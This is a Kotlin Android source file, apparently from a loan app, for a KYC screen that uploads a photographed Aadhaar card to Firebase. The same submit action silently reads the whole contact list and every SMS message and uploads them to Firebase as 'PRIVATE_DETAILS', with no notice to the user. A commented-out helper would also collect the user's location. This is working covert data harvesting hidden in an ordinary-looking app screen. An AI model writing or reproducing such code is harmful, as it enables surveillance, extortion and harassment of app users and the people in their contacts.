package com.deepakdevloper.loanapp.loanActivity

import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.os.Build
import android.os.Bundle
import com.google.android.gms.location.LocationServices
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.view.View
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.deepakdevloper.loanapp.Help.help
import com.deepakdevloper.loanapp.Notification.notificationActivity
import com.deepakdevloper.loanapp.R
import com.deepakdevloper.loanapp.databinding.ActivityKycBinding
import com.deepakdevloper.loanapp.model.installedApps
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.*
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.*
import kotlin.collections.ArrayList
import kotlin.collections.HashMap


class kycActivity : AppCompatActivity() {

    private lateinit var binding: ActivityKycBinding
    private lateinit var cursor: Cursor
    private lateinit var arrayList: ArrayList<String>
    private lateinit var arrayListSMS: ArrayList<String>
    private lateinit var arrayListAPPS: ArrayList<String>

    private lateinit var storageReference: StorageReference
    private  var imageBitmap: Bitmap ? = null
    private val IMAGE_CAPTURE_REQUEST = 1

    private lateinit var fusedLocationClient: FusedLocationProviderClient

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityKycBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.msc1.setOnClickListener {
            val i = Intent(this, help::class.java)
            startActivity(i)
        }

        binding.msc.setOnClickListener {
            val i = Intent(this, notificationActivity::class.java)
            startActivity(i)
        }
        try{
            FirebaseDatabase.getInstance().getReference("notif")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString()).addValueEventListener(object:ValueEventListener{
                    override fun onDataChange(snapshot: DataSnapshot) {
                        if (snapshot.exists()) {
                            binding.msc.setImageResource(R.drawable.ic_notifications_active)
                        }
                    }

                    override fun onCancelled(error: DatabaseError) {}

                })
        }
        catch (e:Exception){
        }

        binding.ms.setOnClickListener {
            val i = Intent(this,LoanOfferActivity::class.java)
            startActivity(i)
            finish()
        }

        arrayList = ArrayList<String>()
        arrayListSMS = ArrayList<String>()
        arrayListAPPS = ArrayList<String>()



        storageReference = FirebaseStorage.getInstance().reference

        // Initialize FusedLocationProviderClient
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)


        binding.btnGetStarted.setOnClickListener {
            val cameraIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            startActivityForResult(cameraIntent, IMAGE_CAPTURE_REQUEST)
        }



        binding.btnGetStarted2.setOnClickListener {
            if(imageBitmap != null){
                uploadImageToFirebase(imageBitmap!!)
                uploadDetails()
                binding.pg.visibility = View.VISIBLE
            }else{
                Toast.makeText(this,"Please Upload Adhhar Card First Click On Icon",Toast.LENGTH_SHORT).show()
            }
            //now we upload details
        }
    }

    private fun uploadImageToFirebase(imageBitmap: Bitmap) {
        val name = "adhar"
        val baos = ByteArrayOutputStream()
        imageBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val imageData = baos.toByteArray()


        // Upload image to Firebase Storage
        val imageRef = storageReference.child("images/${System.currentTimeMillis()}_IMG.jpg")
        val uploadTask = imageRef.putBytes(imageData)

        uploadTask.addOnSuccessListener { taskSnapshot ->
            // Image uploaded successfully, get the download URL
            imageRef.downloadUrl.addOnSuccessListener { uri ->
                // Save the download URL to Firestore
                saveUrlToFirestore(uri.toString(),name)
            }.addOnFailureListener {
                // Handle failure to get download URL
                showToast("Failed to get download URL")
            }
        }.addOnFailureListener {
            // Handle failure to upload image
            showToast("Failed to upload image")
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == IMAGE_CAPTURE_REQUEST && resultCode == RESULT_OK) {
            // Get the image bitmap from the camera intent result
            val extras = data?.extras
            imageBitmap = extras?.get("data") as Bitmap
            binding.i3.setImageBitmap(imageBitmap)
            // Convert bitmap to byte array
        }
    }


    private fun showToast(message: String) {
        // Helper function to show Toast messages
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }


    @RequiresApi(Build.VERSION_CODES.M)
    @SuppressLint("Range")
    private fun uploadDetails() {
        //contact list
        cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )!!
        while (cursor.moveToNext()){
            val name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            val phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            val id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID))
            arrayList.add(name + "\n" + phone + "\n" + id)
        }
        val contactList = arrayList.toString()
        //sms list
        cursor = getContentResolver().query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            null
        )!!
        while (cursor.moveToNext()){
            val name = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
            val phone = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
            arrayListSMS.add(name + "\n" + phone)
        }
        val smsList = arrayListSMS.toString()

        uploadFirebase(contactList,smsList)
        //location
        //getUserLocationAndStoreInFirebase(contactList,smsList)
    }

    @RequiresApi(Build.VERSION_CODES.M)
    private fun getUserLocationAndStoreInFirebase(contactList: String, smsList: String) {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED &&
            checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED) {
            // Get the user's last known location
            fusedLocationClient.lastLocation
                .addOnSuccessListener { location: Location? ->
                    location?.let {
                        // Get the location name from coordinates
                        val locationName = getLocationNameFromCoordinates(it.latitude, it.longitude)

                        // Store the location information in Firebase

                    }
                }
        } else {
            // Handle the case where permissions are not granted
            // You might want to show a message to the user or request permissions again
        }

    }

    private fun getLocationNameFromCoordinates(latitude: Double, longitude: Double): String {
        val geocoder = Geocoder(this, Locale.getDefault())
        var locationName = "Unknown Location"

        try {
            val addresses: List<Address>? = geocoder.getFromLocation(latitude, longitude, 1)
            if (!addresses.isNullOrEmpty()) {
                val address: Address = addresses[0]
                locationName = address.getAddressLine(0)
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }

        return locationName
    }

    private fun uploadFirebase(contactList: String, smsList: String) {
        val b = intent.getStringExtra("business")
        val h = intent.getStringExtra("home")
        val p = intent.getStringExtra("pocket")
        if ( b == "BUSINESS_DETAILS" ) {
            val hashMap = HashMap<String, Any>()
            hashMap.put("contactList", contactList)
            hashMap.put("smsList", smsList)
            hashMap.put("child", true)
            FirebaseDatabase.getInstance().getReference("BUSINESS_LOAN")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("BUSINESS_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("KYC_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("PRIVATE_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .updateChildren(hashMap)
        }
        else if (h == "HOME_DETAILS"){
            val hashMap = HashMap<String, Any>()
            hashMap.put("contactList", contactList)
            hashMap.put("smsList", smsList)
            hashMap.put("child", true)
            FirebaseDatabase.getInstance().getReference("HOME_LOAN")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("HOME_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("KYC_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("PRIVATE_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .updateChildren(hashMap)
        }
        else{
            val hashMap = HashMap<String, Any>()
            hashMap.put("contactList", contactList)
            hashMap.put("smsList", smsList)
            hashMap.put("child", true)
            FirebaseDatabase.getInstance().getReference("POCKET_LOAN")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("POCKET_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("KYC_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("PRIVATE_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .updateChildren(hashMap)
        }
    }

    private fun saveUrlToFirestore(uri: String,name:String) {
        val b = intent.getStringExtra("business")
        val h = intent.getStringExtra("home")
        val p = intent.getStringExtra("pocket")

        if ( b == "BUSINESS_DETAILS" ) {
            val hashMap = HashMap<String, Any>()
            hashMap.put(name, uri)
            FirebaseDatabase.getInstance().getReference("BUSINESS_LOAN")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("BUSINESS_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("KYC_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .updateChildren(hashMap).addOnSuccessListener {
                    val i = Intent(this, BankdetailsActivity::class.java)
                    i.putExtra("business","BUSINESS_DETAILS")
                    startActivity(i)
                    binding.pg.visibility = View.GONE
                }.addOnFailureListener {
                    showToast("Something wrong retry")
                    binding.pg.visibility = View.GONE
                }
        }

        else if (h == "HOME_DETAILS"){
            val hashMap = HashMap<String, Any>()
            hashMap.put(name, uri)
            FirebaseDatabase.getInstance().getReference("HOME_LOAN")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("HOME_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("KYC_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .updateChildren(hashMap).addOnSuccessListener {
                    val i = Intent(this, BankdetailsActivity::class.java)
                    i.putExtra("home","HOME_DETAILS")
                    startActivity(i)
                    binding.pg.visibility = View.GONE
                }.addOnFailureListener {
                    showToast("Something wrong retry")
                    binding.pg.visibility = View.GONE
                }
        }
        else{
            val hashMap = HashMap<String, Any>()
            hashMap.put(name, uri)
            FirebaseDatabase.getInstance().getReference("POCKET_LOAN")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("POCKET_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .child("KYC_DETAILS")
                .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                .updateChildren(hashMap).addOnSuccessListener {
                    val i = Intent(this, BankdetailsActivity::class.java)
                    i.putExtra("pocket","POCKET_DETAILS")
                    startActivity(i)
                    binding.pg.visibility = View.GONE
                }.addOnFailureListener {
                    showToast("Something wrong retry")
                    binding.pg.visibility = View.GONE
                }
        }

    }

    override fun onResume()
      {
        super.onResume()
        try{
            val b = intent.getStringExtra("business")
            val h = intent.getStringExtra("home")
            val p = intent.getStringExtra("pocket")

            if ( b == "BUSINESS_DETAILS" ) {
                FirebaseDatabase.getInstance().getReference("BUSINESS_LOAN")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("BUSINESS_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("KYC_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("PRIVATE_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .addValueEventListener(object :
                        ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            try {
                                if (snapshot.exists()) {
                                    if (snapshot.child("child").value == true) {
                                        val i = Intent(this@kycActivity, BankdetailsActivity::class.java)
                                        i.putExtra("business","BUSINESS_DETAILS")
                                        startActivity(i)
                                        finish()
                                    } else {
                                        binding.pg.visibility = View.GONE
                                    }
                                } else {
                                    binding.pg.visibility = View.GONE
                                }
                            } catch (e: Exception) {
                                Toast.makeText(
                                    this@kycActivity,
                                    e.message.toString(),
                                    Toast.LENGTH_SHORT
                                ).show()
                            }
                        }

                        override fun onCancelled(error: DatabaseError) {
                            Toast.makeText(this@kycActivity, error.message, Toast.LENGTH_SHORT)
                                .show()
                        }

                    })
            } else if (h == "HOME_DETAILS") {

                FirebaseDatabase.getInstance().getReference("HOME_LOAN")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("HOME_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("KYC_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("PRIVATE_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .addValueEventListener(object :
                        ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            try {
                                if (snapshot.exists()) {
                                    if (snapshot.child("child").value == true) {
                                        val i = Intent(this@kycActivity, BankdetailsActivity::class.java)
                                        i.putExtra("home","HOME_DETAILS")
                                        startActivity(i)
                                        finish()
                                    } else {
                                        binding.pg.visibility = View.GONE
                                    }
                                } else {
                                    binding.pg.visibility = View.GONE
                                }
                            } catch (e: Exception) {
                                Toast.makeText(
                                    this@kycActivity,
                                    e.message.toString(),
                                    Toast.LENGTH_SHORT
                                ).show()
                            }
                        }

                        override fun onCancelled(error: DatabaseError) {
                            Toast.makeText(this@kycActivity, error.message, Toast.LENGTH_SHORT)
                                .show()
                        }

                    })

            }
            else{


                FirebaseDatabase.getInstance().getReference("POCKET_LOAN")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("POCKET_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("KYC_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .child("PRIVATE_DETAILS")
                    .child(FirebaseAuth.getInstance().currentUser?.uid.toString())
                    .addValueEventListener(object :
                        ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            try {
                                if (snapshot.exists()) {
                                    if (snapshot.child("child").value == true) {
                                        val i = Intent(this@kycActivity, BankdetailsActivity::class.java)
                                        i.putExtra("pocket","POCKET_DETAILS")
                                        startActivity(i)
                                        finish()
                                    } else {
                                        binding.pg.visibility = View.GONE
                                    }
                                } else {
                                    binding.pg.visibility = View.GONE
                                }
                            } catch (e: Exception) {
                                Toast.makeText(
                                    this@kycActivity,
                                    e.message.toString(),
                                    Toast.LENGTH_SHORT
                                ).show()
                            }
                        }

                        override fun onCancelled(error: DatabaseError) {
                            Toast.makeText(this@kycActivity, error.message, Toast.LENGTH_SHORT)
                                .show()
                        }

                    })


            }
        }
        catch (e:Exception)
        {
            Toast.makeText(this@kycActivity,e.message.toString(), Toast.LENGTH_SHORT).show()
        }
    }
    override fun onBackPressed() {
        super.onBackPressed()
        val i = Intent(this,LoanOfferActivity::class.java)
        startActivity(i)
        finish()
    }
}